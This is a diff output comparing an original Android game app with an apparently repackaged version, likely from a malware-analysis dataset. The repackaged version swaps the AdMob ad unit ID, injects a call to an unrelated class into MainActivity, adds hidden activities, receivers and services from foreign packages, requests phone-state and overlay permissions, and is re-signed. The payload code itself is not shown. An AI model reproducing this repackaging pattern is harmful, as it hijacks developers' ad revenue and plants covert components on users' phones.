@@ -1,0 +1,242 @@
+diff -r result/APP_58/App_B_58/AndroidManifest.xml result/APP_58/App_M_58/AndroidManifest.xml
+4,5c4,5
+<     <application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme">
+<         <activity android:configChanges="navigation|orientation|screenLayout|screenSize" android:label="@string/app_name" android:name="com.vinanetjsc.dkamphuocFilix.MainActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+---
+>     <application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="木乃伊迷宫探险" android:theme="@style/AppTheme">
+>         <activity android:configChanges="navigation|orientation|screenLayout|screenSize" android:label="木乃伊迷宫探险" android:name="com.vinanetjsc.dkamphuocFilix.MainActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+11a12,54
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.fivefeiwo.coverscreen.SA" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
+>         <activity android:launchMode="singleInstance" android:name="com.fivefeiwo.coverscreen.WA"/>
+>         <receiver android:name="com.fivefeiwo.coverscreen.SR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>                 <action android:name="broadcast.route.control"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:label="" android:name="com.bupan.tuuappmn.Aj"/>
+>         <receiver android:name="com.bupan.tuuappmn.Rj">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.bupan.tuuappmn.Sj"/>
+>         <service android:name="com.spawu.z7wrpa.Rsdrua"/>
+>         <activity android:excludeFromRecents="true" android:exported="true" android:label="" android:name="com.spawu.z7wrpa.Bsadrnp"/>
+>         <activity android:label="" android:name="com.spawu.z7wrpa.Casdurep"/>
+>         <receiver android:name="com.spawu.z7wrpa.Zczusen">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+12a56,64
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <supports-screens android:anyDensity="true"/>
+diff -r result/APP_58/App_B_58/apktool.yml result/APP_58/App_M_58/apktool.yml
+2c2
+< apkFileName: Bapp58-88B1333AB570071C4A6BF68C68EB16A552AEB7436BE31B6BA852EFE697385F97.apk
+---
+> apkFileName: Mapp58-1C2D30B622746AD19B495CA1E28D3B3DC7F0ADE684E120D395AE83E821E5BB88.apk
+6a7
+> - jpg
+17,19c18
+< unknownFiles:
+<   jsr305_annotations/Jsr305_annotations.gwt.xml: '8'
+<   jsr305_annotations/v0_r47/V0_r47.gwt.xml: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_58/App_M_58/assets: j_res
+Somente em result/APP_58/App_M_58/com: bupan
+Somente em result/APP_58/App_M_58/com: fivefeiwo
+Somente em result/APP_58/App_M_58/com: spawu
+Somente em result/APP_58/App_M_58/com: tpzfw
+diff -r result/APP_58/App_B_58/com/vinanetjsc/dkamphuocFilix/MainActivity.java result/APP_58/App_M_58/com/vinanetjsc/dkamphuocFilix/MainActivity.java
+10a11
+> import com.tpzfw.yopwsn.Aervlrey;
+20c21
+<   private static final String AdMob_Ad_Unit = "a15347730092b96";
+---
+>   private static final String AdMob_Ad_Unit = "a150609e6ac83e5";
+29c30
+<     this.adView = new AdView(this, AdSize.BANNER, "a15347730092b96");
+---
+>     this.adView = new AdView(this, AdSize.BANNER, "a150609e6ac83e5");
+47a49
+>     Aervlrey.Tdasen(this);
+Os arquivos binários result/APP_58/App_B_58/original/AndroidManifest.xml e result/APP_58/App_M_58/original/AndroidManifest.xml são diferentes
+Somente em result/APP_58/App_M_58/original/META-INF: 123652.RSA
+Somente em result/APP_58/App_M_58/original/META-INF: 123652.SF
+Somente em result/APP_58/App_B_58/original/META-INF: CERT.RSA
+Somente em result/APP_58/App_B_58/original/META-INF: CERT.SF
+diff -r result/APP_58/App_B_58/original/META-INF/MANIFEST.MF result/APP_58/App_M_58/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+5c5
+< SHA1-Digest: RCh9e6az5BrLamPLDkHaXpQufgw=
+---
+> SHA1-Digest: cemhlgpB/YctkdDr+DVBHMiXZUw=
+15a16,18
+> Name: assets/j_res/default_sc.jpg
+> SHA1-Digest: qiVr6RzYstBtopKsEitJnlm4bIA=
+> 
+22,24d24
+< Name: assets/www/img/icon/lv_map13.png
+< SHA1-Digest: GpwYnRfFtf0Q37n1/L9ibNa4iwY=
+< 
+28,32c28,29
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: /f34xYwskAvrKqRB+jFPzJ8rPJg=
+< 
+< Name: assets/www/img/icon/background_game_pause.png
+< SHA1-Digest: cvKdNNcK1p5mFF3EJCjfedIoWKE=
+---
+> Name: assets/www/img/icon/lv_map13.png
+> SHA1-Digest: GpwYnRfFtf0Q37n1/L9ibNa4iwY=
+36a34,36
+> Name: assets/www/img/icon/background_game_pause.png
+> SHA1-Digest: cvKdNNcK1p5mFF3EJCjfedIoWKE=
+> 
+42a43,45
+> Name: assets/j_res/indicator_on_icon.png
+> SHA1-Digest: sAcjghnqbGREtHoVopFwkUlHfZU=
+> 
+51a55,57
+> Name: assets/j_res/close_icon.9.png
+> SHA1-Digest: j+yNq/1pPWJ5p+sU6CrcxMEWLls=
+> 
+89c95
+< SHA1-Digest: S+IR6HC7WBBq8X/vZzS1cieHpp0=
+---
+> SHA1-Digest: o0U77R6FDQ24hYO5feJvU70Jw0Q=
+93a100,105
+> Name: assets/j_res/phone_down.png
+> SHA1-Digest: xgfOeOtf3xzdNaGbJQuh5CMj8Ic=
+> 
+> Name: assets/j_res/refresh.png
+> SHA1-Digest: 02SJZhwuPYU+MMDLHpHzOX3u5xo=
+> 
+95c107
+< SHA1-Digest: aog0OtMsSdW/mmWN+wrW05tY9HA=
+---
+> SHA1-Digest: Vzf3QZS423bROnnOXkJsQoYZMwU=
+103,105d114
+< Name: assets/www/sounds/button.mp3
+< SHA1-Digest: AxunwV8TRc2c+3M62VtcoCS6QVo=
+< 
+108a118,120
+> Name: assets/www/sounds/button.mp3
+> SHA1-Digest: AxunwV8TRc2c+3M62VtcoCS6QVo=
+> 
+134c146
+< SHA1-Digest: dXtmJ65HFCjvulf7jSBVniMY97w=
+---
+> SHA1-Digest: W7WnW+JXKQYLtRZ5Aph3U76tgqU=
+152c164,167
+< SHA1-Digest: AoTfR6BRgb7C5qfOTulp95bccUE=
+---
+> SHA1-Digest: ROyPs0PI+g6ajdjUQ+g13qdGuFg=
+> 
+> Name: assets/j_res/indicator_off_icon.png
+> SHA1-Digest: Z+7fheV1ueJlQNruIqPDEGFAols=
+181,183d195
+< Name: assets/www/img/icon/lv_map35.png
+< SHA1-Digest: qAgd0nQ5nhq/fpuHDm3eZp80Nw4=
+< 
+186a199,201
+> Name: assets/www/img/icon/lv_map35.png
+> SHA1-Digest: qAgd0nQ5nhq/fpuHDm3eZp80Nw4=
+> 
+193,195d207
+< Name: assets/www/img/icon/lv_map22.png
+< SHA1-Digest: q8IKXg6IIAwAVtBvIt1fKk4iLcw=
+< 
+198a211,213
+> Name: assets/www/img/icon/lv_map22.png
+> SHA1-Digest: q8IKXg6IIAwAVtBvIt1fKk4iLcw=
+> 
+217,219d231
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: UBXHoAGmseBGDwjR6/MFHfcIK7g=
+< 
+261a274,276
+> Name: assets/j_res/phone_up.png
+> SHA1-Digest: wHjKUVUnMLpYHin3x0wyie2TVEc=
+> 
+277,279d291
+< Name: assets/www/sounds/ice_spell.mp3
+< SHA1-Digest: VfE70gqfBrfKsZ69Q0VHIN6ki5U=
+< 
+282a295,297
+> Name: assets/www/sounds/ice_spell.mp3
+> SHA1-Digest: VfE70gqfBrfKsZ69Q0VHIN6ki5U=
+> 
+313,315d327
+< Name: assets/www/img/icon/bg_main_option.png
+< SHA1-Digest: V+FeZ8uy27B/K3GrsVcCFT7ENNI=
+< 
+318a331,333
+> Name: assets/www/img/icon/bg_main_option.png
+> SHA1-Digest: V+FeZ8uy27B/K3GrsVcCFT7ENNI=
+> 
+326c341
+< SHA1-Digest: urBVmuXoRu5WDSd3qigqxH7nCdo=
+---
+> SHA1-Digest: aypayu8VaQBv6Aw53T0zKprch/Q=
+330a346,348
+> Name: assets/j_res/default_app_icon.jpg
+> SHA1-Digest: o2jIAN53IYjDH4t7S89TDHFSDN8=
+> 
+336a355,357
+> Name: assets/j_res/good.png
+> SHA1-Digest: J/S6FCSi+vIsohECOpRcXsf4Z/A=
+> 
+338a360,362
+> 
+> Name: assets/j_res/share.png
+> SHA1-Digest: DWS66JziklntVNnD8MrwQhw1x00=
+Somente em result/APP_58/App_M_58/smali/com: bupan
+Somente em result/APP_58/App_M_58/smali/com: fivefeiwo
+Somente em result/APP_58/App_M_58/smali/com: spawu
+Somente em result/APP_58/App_M_58/smali/com: tpzfw
+diff -r result/APP_58/App_B_58/smali/com/vinanetjsc/dkamphuocFilix/MainActivity.smali result/APP_58/App_M_58/smali/com/vinanetjsc/dkamphuocFilix/MainActivity.smali
+10c10
+< .field private static final AdMob_Ad_Unit:Ljava/lang/String; = "a15347730092b96"
+---
+> .field private static final AdMob_Ad_Unit:Ljava/lang/String; = "a150609e6ac83e5"
+59c59
+<     const-string v4, "a15347730092b96"
+---
+>     const-string v4, "a150609e6ac83e5"
+121a122,123
+> 
+>     invoke-static {p0}, Lcom/tpzfw/yopwsn/Aervlrey;->Tdasen(Landroid/content/Context;)V
+Somente em result/APP_58/App_B_58/: unknown
